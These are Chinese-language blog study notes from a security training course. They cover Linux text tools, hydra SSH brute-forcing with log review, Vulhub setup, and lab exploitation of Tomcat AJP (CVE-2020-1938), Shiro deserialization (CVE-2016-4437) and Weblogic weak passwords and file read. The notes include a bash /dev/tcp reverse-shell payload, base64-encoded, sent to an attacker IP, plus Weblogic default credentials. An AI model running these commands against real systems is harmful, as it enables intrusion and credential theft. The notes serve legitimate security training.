<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#语法：cat(选项)(参数)</span></span><br><span class="line">-n或-number：有1开始对所有输出的行数编号；</span><br><span class="line">-b或--number-nonblank：和-n相似，只不过对于空白行不编号；</span><br><span class="line">-s或--squeeze-blank：当遇到有连续两行以上的空白行，就代换为一行的空白行；</span><br><span class="line">-A：显示不可打印字符，行尾显示“$”；</span><br><span class="line">-e：等价于<span class="string">&quot;-vE&quot;</span>选项；</span><br><span class="line">-t：等价于<span class="string">&quot;-vT&quot;</span>选项；</span><br><span class="line"></span><br><span class="line"><span class="comment">#示例：</span></span><br><span class="line"><span class="built_in">cat</span> 1.txt</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>head命令</li>
</ol>
<p>head命令用于显示文件的开头的内容。在默认情况下，head命令显示文件的头10行内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#语法：head(选项)(参数)</span></span><br><span class="line">-n&lt;数字&gt;：指定显示头部内容的行数；</span><br><span class="line"></span><br><span class="line"><span class="comment">#示例：</span></span><br><span class="line"><span class="built_in">head</span> -n 5 log.txt                <span class="comment">#显示文件的前n行</span></span><br><span class="line"><span class="built_in">head</span> -n -5 log.txt               <span class="comment">#输出文件除了最后n行的全部内容</span></span><br><span class="line"><span class="built_in">head</span> -c 30 log.txt               <span class="comment">#显示文件前n个字节</span></span><br><span class="line"><span class="built_in">head</span> log.txt  log1.txt           <span class="comment">#一次显示多个文件</span></span><br></pre></td></tr></table></figure>

<ol start="5">
<li>tail命令</li>
</ol>
<p>tail命令用于输入文件中的尾部内容。tail命令默认在屏幕上显示指定文件的末尾10行。如果给定的文件不止一个，则在显示的每个文件前面加一个文件名标题。如果没有指定文件或者文件名为“-”，则读取标准输入。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">语法：<span class="built_in">tail</span>(选项)(参数)</span><br><span class="line">--retry：即是在<span class="built_in">tail</span>命令启动时，文件不可访问或者文件稍后变得不可访问，都始终尝试打开文件。使用此选项时需要与选项“——follow=name”连用；</span><br><span class="line">-c&lt;N&gt;或——bytes=&lt;N&gt;：输出文件尾部的N（N为整数）个字节内容；</span><br><span class="line">-f&lt;name/descriptor&gt;或；--follow&lt;nameldescript&gt;：显示文件最新追加的内容。“name”表示以文件名的方式监视文件的变化。“-f”与“-fdescriptor”等效；</span><br><span class="line">-F：与选项“-follow=name”和“--retry<span class="string">&quot;连用时功能相同；</span></span><br><span class="line"><span class="string">-n&lt;N&gt;或——line=&lt;N&gt;：输出文件的尾部N（N位数字）行内容。</span></span><br><span class="line"><span class="string">--pid=&lt;进程号&gt;：与“-f”选项连用，当指定的进程号的进程终止后，自动退出tail命令；</span></span><br><span class="line"><span class="string">-q或——quiet或——silent：当有多个文件参数时，不输出各个文件名；</span></span><br><span class="line"><span class="string">-s&lt;秒数&gt;或——sleep-interal=&lt;秒数&gt;：与“-f”选项连用，指定监视文件变化时间隔的秒数；</span></span><br><span class="line"><span class="string">-v或——verbose：当有多个文件参数时，总是输出各个文件名；</span></span><br><span class="line"><span class="string">--help：显示指令的帮助信息；</span></span><br><span class="line"><span class="string">--version：显示指令的版本信息。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#示例：</span></span><br><span class="line"><span class="string">tail -f /var/log/messages       #实时查看日志</span></span><br><span class="line"><span class="string">tail -n 1000                    #显示最后1000行           </span></span><br><span class="line"><span class="string">tail -n +1000                   #从1000行开始显示，显示1000行以后的</span></span><br></pre></td></tr></table></figure>

<ol start="6">
<li>grep命令</li>
</ol>
<p>全面搜索正则表达式并把行打印出来）是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。</p>
<p>grep的工作方式是这样的，它在一个或多个文件中搜索字符串模板。如果模板包括空格，则必须被引用，模板后的所有字符串被看作文件名。搜索的结果被送到标准输出，不影响原文件内容。</p>
<p>grep可用于shell脚本，因为grep通过返回一个状态值来说明搜索的状态，如果模板搜索成功，则返回0，如果搜索不成功，则返回1，如果搜索的文件不存在，则返回2。我们利用这些返回值就可进行一些自动化的文本处理工作。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#参数：</span></span><br><span class="line">-a 不要忽略二进制数据。</span><br><span class="line">-A&lt;显示列数&gt; 除了显示符合范本样式的那一行之外，并显示该行之后的内容。</span><br><span class="line">-b 在显示符合范本样式的那一行之外，并显示该行之前的内容。</span><br><span class="line">-c 计算符合范本样式的列数。</span><br><span class="line">-C&lt;显示列数&gt;或-&lt;显示列数&gt;  除了显示符合范本样式的那一列之外，并显示该列之前后的内容。</span><br><span class="line">-d&lt;进行动作&gt; 当指定要查找的是目录而非文件时，必须使用这项参数，否则grep命令将回报信息并停止动作。</span><br><span class="line">-e&lt;范本样式&gt; 指定字符串作为查找文件内容的范本样式。</span><br><span class="line">-E 将范本样式为延伸的普通表示法来使用，意味着使用能使用扩展正则表达式。</span><br><span class="line">-f&lt;范本文件&gt; 指定范本文件，其内容有一个或多个范本样式，让grep查找符合范本条件的文件内容，格式为每一列的范本样式。</span><br><span class="line">-F 将范本样式视为固定字符串的列表。</span><br><span class="line">-G 将范本样式视为普通的表示法来使用。</span><br><span class="line">-h 在显示符合范本样式的那一列之前，不标示该列所属的文件名称。</span><br><span class="line">-H 在显示符合范本样式的那一列之前，标示该列的文件名称。</span><br><span class="line">-i 忽略字符大小写的差别。</span><br><span class="line">-l 列出文件内容符合指定的范本样式的文件名称。</span><br><span class="line">-L 列出文件内容不符合指定的范本样式的文件名称。</span><br><span class="line">-n 在显示符合范本样式的那一列之前，标示出该列的编号。</span><br><span class="line">-q 不显示任何信息。</span><br><span class="line">-R/-r 此参数的效果和指定“-d recurse”参数相同。</span><br><span class="line">-s 不显示错误信息。</span><br><span class="line">-v 反转查找。</span><br><span class="line">-w 只显示全字符合的列。</span><br><span class="line">-x 只显示全列符合的列。</span><br><span class="line">-y 此参数效果跟“-i”相同。</span><br><span class="line">-o 只输出文件中匹配到的部分。</span><br><span class="line"></span><br><span class="line"><span class="comment">#grep的规则表达式:</span></span><br><span class="line">^       <span class="comment">#锚定行的开始 如：&#x27;^grep&#x27;匹配所有以grep开头的行。    </span></span><br><span class="line">$        <span class="comment">#锚定行的结束 如：&#x27;grep$&#x27;匹配所有以grep结尾的行。    </span></span><br><span class="line">.        <span class="comment">#匹配一个非换行符的字符 如：&#x27;gr.p&#x27;匹配gr后接一个任意字符，然后是p。    </span></span><br><span class="line">*        <span class="comment">#匹配零个或多个先前字符 如：&#x27;*grep&#x27;匹配所有一个或多个空格后紧跟grep的行。    </span></span><br><span class="line">.*        <span class="comment">#一起用代表任意字符。   </span></span><br><span class="line">[]        <span class="comment">#匹配一个指定范围内的字符，如&#x27;[Gg]rep&#x27;匹配Grep和grep。    </span></span><br><span class="line">[^]      <span class="comment">#匹配一个不在指定范围内的字符，如：&#x27;[^A-FH-Z]rep&#x27;匹配不包含A-R和T-Z的一个字母开头，紧跟rep的行。    </span></span><br><span class="line">\(..\)     <span class="comment">#标记匹配字符，如&#x27;\(love\)&#x27;，love被标记为1。    </span></span><br><span class="line">\&lt;        <span class="comment">#锚定单词的开始，如:&#x27;\&lt;grep&#x27;匹配包含以grep开头的单词的行。    </span></span><br><span class="line">\&gt;        <span class="comment">#锚定单词的结束，如&#x27;grep\&gt;&#x27;匹配包含以grep结尾的单词的行。    </span></span><br><span class="line">x\&#123;m\&#125;   <span class="comment">#重复字符x，m次，如：&#x27;0\&#123;5\&#125;&#x27;匹配包含5个o的行。    </span></span><br><span class="line">x\&#123;m,\&#125;   <span class="comment">#重复字符x,至少m次，如：&#x27;o\&#123;5,\&#125;&#x27;匹配至少有5个o的行。    </span></span><br><span class="line">x\&#123;m,n\&#125;  <span class="comment">#重复字符x，至少m次，不多于n次，如：&#x27;o\&#123;5,10\&#125;&#x27;匹配5--10个o的行。   </span></span><br><span class="line">\w       <span class="comment">#匹配文字和数字字符，也就是[A-Za-z0-9]，如：&#x27;G\w*p&#x27;匹配以G后跟零个或多个文字或数字字符，然后是p。   </span></span><br><span class="line">\W       <span class="comment">#\w的反置形式，匹配一个或多个非单词字符，如点号句号等。   </span></span><br><span class="line">\b        <span class="comment">#单词锁定符，如: &#x27;\bgrep\b&#x27;只匹配grep。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#示例：</span></span><br><span class="line">ps -ef|grep svn					<span class="comment">#查找指定进程</span></span><br><span class="line">grep <span class="string">&#x27;INFO&#x27;</span> demo.log				<span class="comment">#在文件中查找所有包含INFO的行</span></span><br><span class="line"><span class="built_in">cat</span> test.txt | grep -f test2.txt      <span class="comment">#从文件中读取关键词进行搜索</span></span><br><span class="line">grep  -n <span class="string">&#x27;linux&#x27;</span> test.txt             <span class="comment">#从文件中查找关键词,显示行号</span></span><br><span class="line"><span class="built_in">cat</span> test.txt |grep hat$             <span class="comment">#输出以hat结尾的行内容</span></span><br><span class="line">ifconfig eth0|grep -E <span class="string">&quot;([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&quot;</span>     <span class="comment">#输出ip地址</span></span><br><span class="line">grep <span class="string">&#x27;.&#x27;</span> access1.log|grep -Ev <span class="string">&#x27;404&#x27;</span> &gt; access2.log   <span class="comment">#没有404的日志信息</span></span><br><span class="line">grep <span class="string">&#x27;Mar 10&#x27;</span> /var/log/messages     <span class="comment">#单独看某一天的日志</span></span><br></pre></td></tr></table></figure>

<ol start="7">
<li><strong>awk命令</strong></li>
</ol>
<p>awk是一种编程语言，用于在linux&#x2F;unix下对文本和数据进行处理。数据可以来自标准输入(stdin)、一个或多个文件，或其它命令的输出。它支持用户自定义函数和动态正则表达式等先进功能，是linux&#x2F;unix下的一个强大编程工具。它在命令行中使用，但更多是作为脚本来使用。awk有很多内建的功能，比如数组、函数等，这是它和C语言的相同之处，灵活性是awk最大的优势。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#语法：awk [-F|-f|-v] ‘BEGIN&#123;&#125; //&#123;command1; command2&#125; END&#123;&#125;’ </span></span><br><span class="line">[-F|-f|-v]   大参数，-F指定分隔符，-f调用脚本，-v定义变量 var=value</span><br><span class="line"><span class="string">&#x27;  &#x27;</span>          引用代码块</span><br><span class="line">BEGIN   初始化代码块，在对每一行进行处理之前，初始化代码，主要是引用全局变量，设置FS分隔符</span><br><span class="line">//           匹配代码块，可以是字符串或正则表达式</span><br><span class="line">&#123;&#125;           命令代码块，包含一条或多条命令</span><br><span class="line">；          多条命令使用分号分隔</span><br><span class="line">END      结尾代码块，在对每一行进行处理之后再执行的代码块，主要是进行最终计算或输出结尾摘要信息</span><br><span class="line"></span><br><span class="line"><span class="comment">#要点：</span></span><br><span class="line"><span class="variable">$0</span>           表示整个当前行</span><br><span class="line"><span class="variable">$1</span>           每行第一个字段</span><br><span class="line">NF          字段数量变量</span><br><span class="line">NR          每行的记录号，多文件记录递增</span><br><span class="line">FNR        与NR类似，不过多文件记录不递增，每个文件都从1开始</span><br><span class="line">\t            制表符</span><br><span class="line">\n           换行符</span><br><span class="line">FS          BEGIN时定义分隔符</span><br><span class="line">RS       输入的记录分隔符， 默认为换行符(即文本是按一行一行输入)</span><br><span class="line">~            匹配，与==相比不是精确比较</span><br><span class="line">!~           不匹配，不精确比较</span><br><span class="line">==         等于，必须全部相等，精确比较</span><br><span class="line">!=           不等于，精确比较</span><br><span class="line">&amp;&amp;　     逻辑与</span><br><span class="line"></span><br><span class="line">||             逻辑或</span><br><span class="line">+            匹配时表示1个或1个以上</span><br><span class="line">/[0-9][0-9]+/   两个或两个以上数字</span><br><span class="line">/[0-9][0-9]*/    一个或一个以上数字</span><br><span class="line">FILENAME 文件名</span><br><span class="line">OFS      输出字段分隔符， 默认也是空格，可以改为制表符等</span><br><span class="line">ORS        输出的记录分隔符，默认为换行符,即处理结果也是一行一行输出到屏幕</span><br><span class="line">-F<span class="string">&#x27;[:#/]&#x27;</span>   定义三个分隔符</span><br><span class="line"></span><br><span class="line"><span class="comment">#示例：</span></span><br><span class="line">sed <span class="string">&#x27;s/book/books/&#x27;</span> file				<span class="comment">#替换文本中的字符串</span></span><br><span class="line">sed –n <span class="string">&#x27;s/test/TEST/p&#x27;</span> file           <span class="comment">#只打印那些发生替换的行</span></span><br><span class="line">sed <span class="string">&#x27;s/book/books/g&#x27;</span> file            <span class="comment">#后缀 /g 标记会替换每一行中的所有匹配</span></span><br><span class="line">sed <span class="string">&#x27;s/\/bin/\/usr\/local\/bin/g&#x27;</span>      <span class="comment">#定界符/出现在样式内部需要进行转义</span></span><br><span class="line">sed <span class="string">&#x27;/^test/&#x27;</span>d file                    <span class="comment">#删除文件中所有开头是test的行</span></span><br></pre></td></tr></table></figure>

<h2 id="日志分析场景实例"><a href="#日志分析场景实例" class="headerlink" title="日志分析场景实例"></a>日志分析场景实例</h2><h3 id="hydra对ssh暴力破解"><a href="#hydra对ssh暴力破解" class="headerlink" title="hydra对ssh暴力破解"></a>hydra对ssh暴力破解</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#新建用户名字典、密码字典</span></span><br><span class="line"><span class="comment"># -L 用户字典 -P 密码字典 -t 线程数(默认16) -vV 详细信息 -e [nsr] null密码、login做密码、优先用户字典做循环</span></span><br><span class="line">hydra -L users.txt -P password.txt -t 16 -vV -e ns 192.168.137.129 ssh</span><br></pre></td></tr></table></figure>

<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><ol>
<li>查看用户最近登录记录</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">last</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>查看最近失败登陆记录</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/auth.log | grep Failed </span><br></pre></td></tr></table></figure>

<ol start="3">
<li>对登陆失败记录进行筛选，选择固定时间段内，固定IP的登陆失败记录和成功记录，可以发现该攻击者成功爆破出用户root、roadlyl的密码。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/auth.log | grep -E <span class="string">&quot;(Jul  6|Jul 06).*Failed.*192.168.137.128&quot;</span> </span><br></pre></td></tr></table></figure>

<h1 id="vulhub配置"><a href="#vulhub配置" class="headerlink" title="vulhub配置"></a>vulhub配置</h1><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install docker -y</span><br></pre></td></tr></table></figure>

<h2 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install docker-compose</span><br></pre></td></tr></table></figure>

<h2 id="配置docker加速"><a href="#配置docker加速" class="headerlink" title="配置docker加速"></a>配置docker加速</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io</span><br></pre></td></tr></table></figure>

<h2 id="下载vulhub漏洞目录"><a href="#下载vulhub漏洞目录" class="headerlink" title="下载vulhub漏洞目录"></a>下载vulhub漏洞目录</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>

<h2 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h2><p>进入相应漏洞文件夹编译启用即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#开启示例</span></span><br><span class="line"><span class="built_in">cd</span> ~/vulhub/struts2/s2-013/</span><br><span class="line"></span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line"><span class="comment">#关闭</span></span><br><span class="line">docker-compose down</span><br><span class="line"></span><br><span class="line"><span class="comment">#进入docker tomcat命令行</span></span><br><span class="line">docker-compose <span class="built_in">exec</span> tomcat bash</span><br></pre></td></tr></table></figure>

<h1 id="tomcat-文件上传漏洞"><a href="#tomcat-文件上传漏洞" class="headerlink" title="tomcat 文件上传漏洞"></a>tomcat 文件上传漏洞</h1><h2 id="简易步骤"><a href="#简易步骤" class="headerlink" title="简易步骤"></a>简易步骤</h2><ol>
<li><p>编写jsp脚本</p>
</li>
<li><p>压缩到<code>.war</code>格式压缩包中</p>
</li>
<li><p>上传到服务器，自动解压至同名目录下</p>
</li>
<li><p>访问jsp脚本</p>
</li>
</ol>
<h2 id="防护手段"><a href="#防护手段" class="headerlink" title="防护手段"></a>防护手段</h2><p>修改口令？</p>
<h1 id="CNVD-2020-10487-CVE-2020-1938-tomcat-ajp-文件读取漏洞"><a href="#CNVD-2020-10487-CVE-2020-1938-tomcat-ajp-文件读取漏洞" class="headerlink" title="CNVD-2020-10487(CVE-2020-1938)tomcat ajp 文件读取漏洞"></a>CNVD-2020-10487(CVE-2020-1938)tomcat ajp 文件读取漏洞</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>   Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
<li>Apache Tomcat 6</li>
<li>Apache Tomcat 7 &lt; 7.0.100</li>
<li>Apache Tomcat 8 &lt; 8.5.51</li>
<li>Apache Tomcat 9 &lt; 9.0.31</li>
</ul>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f <span class="string">&quot;/WEB-INF/web.xml&quot;</span> 192.168.137.129</span><br></pre></td></tr></table></figure>

<p>对脚本加以修改，这里下到一个增加了<code>--rce</code>来反弹shell的py3脚本：</p>
<p>鏈接: <a href="https://pan.baidu.com/s/101wFmK1J0OGYRC383fdBBA">https://pan.baidu.com/s/101wFmK1J0OGYRC383fdBBA</a> 提取碼: xg4s</p>
<p>执行命令，msf获得反弹shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 2020-10487.py -p 8009 -f /WEB-INF/shell.jsp 192.168.137.129 --rce 1</span><br></pre></td></tr></table></figure>

<h2 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h2><ol>
<li><p>升级tomcat版本</p>
</li>
<li><p>关闭8809端口</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
        <tag>vulhub</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全1x08】安恒厂家网络安全培训 --- day8</title>
    <url>/1080/</url>
    <content><![CDATA[<p>上午讲vulhub靶机，有Shiro 1.2.4反序列化漏洞，Weblogic weak password。</p>
<p>下午讲恶意样本分析指南。</p>
<span id="more"></span>

<h1 id="Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）"><a href="#Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）" class="headerlink" title="Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）"></a>Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>Apache Shiro &lt;&#x3D; 1.2.4</li>
</ul>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值 &gt;  Base64解码–&gt;AES解密–&gt;反序列化。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。</p>
<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><p>shiro反序列化的特征：在返回包的 Set-Cookie 中存在 rememberMe&#x3D;deleteMe 字段。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol>
<li>base64加密反弹shell命令：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#明文</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.137.128/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment">#密文</span></span><br><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNy4xMjgvNDQ0NCAwPiYx&#125;|&#123;<span class="built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>攻击机开启nc监听：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>执行命令，反弹shell：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 shiro_exploit.py -t 3 -u http://192.168.137.129:8080 -p <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNy4xMjgvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<h1 id="Weblogic-weak-password"><a href="#Weblogic-weak-password" class="headerlink" title="Weblogic weak password"></a>Weblogic weak password</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>本环境模拟了一个真实的weblogic环境，其后台存在一个弱口令，并且前台存在任意文件读取漏洞。分别通过这两种漏洞，模拟对weblogic场景的渗透。</p>
<ul>
<li>Weblogic版本：10.3.6(11g)</li>
<li>Java版本：1.6</li>
</ul>
<h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>环境启动后，访问<a href="http://your-ip:7001/console%EF%BC%8C%E5%8D%B3%E4%B8%BAweblogic%E5%90%8E%E5%8F%B0%E3%80%82">http://your-ip:7001/console，即为weblogic后台。</a></p>
<p>本环境存在弱口令：</p>
<ul>
<li>weblogic</li>
<li>Oracle@123</li>
</ul>
<p>weblogic常用弱口令： <a href="http://cirt.net/passwords?criteria=weblogic">http://cirt.net/passwords?criteria=weblogic</a></p>
<p>后台上传webshell</p>
<p>获取到管理员密码后，登录后台。点击左侧的部署，可见一个应用列表：</p>
<p>上传war包。</p>
<p>填写应用名称：</p>
<p>继续一直下一步，最后点完成。</p>
<p>成功获取webshell：</p>
<h2 id="任意文件读取漏洞的利用"><a href="#任意文件读取漏洞的利用" class="headerlink" title="任意文件读取漏洞的利用"></a>任意文件读取漏洞的利用</h2><p>假设不存在弱口令，如何对weblogic进行渗透？</p>
<p>本环境前台模拟了一个任意文件下载漏洞，访问<a href="http://your-ip:7001/hello/file.jsp?path=/etc/passwd%E5%8F%AF%E8%A7%81%E6%88%90%E5%8A%9F%E8%AF%BB%E5%8F%96passwd%E6%96%87%E4%BB%B6%E3%80%82%E9%82%A3%E4%B9%88%EF%BC%8C%E8%AF%A5%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%EF%BC%9F">http://your-ip:7001/hello/file.jsp?path=/etc/passwd可见成功读取passwd文件。那么，该漏洞如何利用？</a></p>
<h2 id="读取后台用户密文与密钥文件"><a href="#读取后台用户密文与密钥文件" class="headerlink" title="读取后台用户密文与密钥文件"></a>读取后台用户密文与密钥文件</h2><p>weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于<code>base_domain</code>下，名为<code>SerializedSystemIni.dat</code>和<code>config.xml</code>，在本环境中为<code>./security/SerializedSystemIni.dat</code>和<code>./config/config.xml</code>（基于当前目录<code>/root/Oracle/Middleware/user_projects/domains/base_domain）</code>。</p>
<p><code>SerializedSystemIni.dat</code>是一个二进制文件，所以一定要用burpsuite来读取，用浏览器直接下载可能引入一些干扰字符。在burp里选中读取到的那一串乱码，右键copy to file就可以保存成一个文件：</p>
<p><code>config.xml</code>是<code>base_domain</code>的全局配置文件，所以乱七八糟的内容比较多，找到其中的<code>&lt;node-manager-password-encrypted&gt;</code>的值，即为加密后的管理员密码，不要找错了：</p>
<h2 id="解密密文"><a href="#解密密文" class="headerlink" title="解密密文"></a>解密密文</h2><p>然后使用本环境的decrypt目录下的<code>weblogic_decrypt.jar</code>，解密密文（或者参考这篇文章：<a href="http://cb.drops.wiki/drops/tips-349.html">http://cb.drops.wiki/drops/tips-349.html</a> ，自己编译一个解密的工具）：</p>
<h1 id="恶意样本分析指南"><a href="#恶意样本分析指南" class="headerlink" title="恶意样本分析指南"></a>恶意样本分析指南</h1>]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
        <tag>vulhub</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全1x09】安恒厂家网络安全培训 --- day9、day10</title>
    <url>/1081/</url>
    <content><![CDATA[<p>这两天进行攻防演练。</p>
<p>第一天搭建环境，winserver物理机+vulhub虚拟机，物理机存在漏洞，物理机搭建cms存在漏洞，vulhub存在漏洞，另外再开启三个漏洞docker。共藏5个flag（物理机1，虚拟机1，docker3）。</p>
<p>第二天进行攻防演练，默认弱口令，攻击其它队伍服务器获取flag，修补自己服务器保护flag。</p>
<span id="more"></span>

<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>记录几个坑。</p>
<ul>
<li><p>安装win2008要注意选择<strong>企业版</strong>，默认安装的<strong>数据中心版</strong>只有命令行。</p>
</li>
<li><p>win2012R2上安装VMWare15时提示更新KB2919355，这是因为Windows2012R2缺少两个更新补丁，请按照顺序进行更新：</p>
<ol>
<li>安装KB2975061更新：<a href="https://www.microsoft.com/zh-CN/download/details.aspx?id=43531">https://www.microsoft.com/zh-CN/download/details.aspx?id=43531</a></li>
<li>安装KB2919355更新（只选择下载安装KB2919355更新即可）：<a href="https://www.microsoft.com/zh-CN/download/details.aspx?id=42334">https://www.microsoft.com/zh-CN/download/details.aspx?id=42334</a></li>
</ol>
</li>
<li><p>kali桥接默认配置得不到地址：</p>
</li>
</ul>
<ol>
<li>vm中<code>编辑--&gt;编辑虚拟网卡</code>选择<code>vmet0</code>桥接至物理机在使用的网卡。</li>
<li>kali编辑网口信息<code>vi /etc/network/interfaces</code>：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address [ip]</span><br><span class="line">netmask [mask]</span><br><span class="line">gateway [gw]</span><br></pre></td></tr></table></figure></li>
<li>配置DNS（如果需要）<code>vi /etc/resolv.conf</code>：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Generated by NetworkManager</span></span><br><span class="line">domain</span><br><span class="line">nameserver [dns]</span><br></pre></td></tr></table></figure></li>
<li>重启网络<code>/etc/init.d/networking restart</code>。</li>
</ol>
<h1 id="攻防演练"><a href="#攻防演练" class="headerlink" title="攻防演练"></a>攻防演练</h1><h2 id="防"><a href="#防" class="headerlink" title="防"></a>防</h2><h3 id="物理机"><a href="#物理机" class="headerlink" title="物理机"></a>物理机</h3><ol>
<li><p><code>控制面板 - 用户账户 - 删除用户账户</code>查看是否有未知用户。</p>
</li>
<li><p>如果可操作服务器实机，也可直接<code>计算机 - 右键属性 - 远程设置 - 关闭远程连接</code>。</p>
</li>
<li><p>网站后台登录改密码。</p>
</li>
<li><p>网站物理目录修改后台页面域名（未确认是否违规）。</p>
</li>
<li><p>网站目录下放置了flag的话，到<code>httpd.conf</code>增加权限，避免被扫出明文：</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;Files ~ <span class="string">&quot;flag.txt&quot;</span>&gt;</span><br><span class="line">Order allow,deny</span><br><span class="line">Deny from all</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>配合攻击，每攻成功一个漏洞，可以seay直接找到源码对应位置修补。</li>
</ol>
<h3 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h3><ol>
<li>修改弱口令：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo passwd [user]</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>踢出其它在线用户：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看当前在线用户</span></span><br><span class="line">w </span><br><span class="line"></span><br><span class="line"><span class="comment">#踢出其它用户，例pts/0，自身是tty</span></span><br><span class="line">pkill -<span class="built_in">kill</span> -t [user]</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>查看用户组是否有新增未知用户：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#新增用户一般在最后一行，工作目录是/home/[user]的那个</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除用户，需要踢出才能删</span></span><br><span class="line">deluser [user]</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>查登录日志：</li>
</ol>
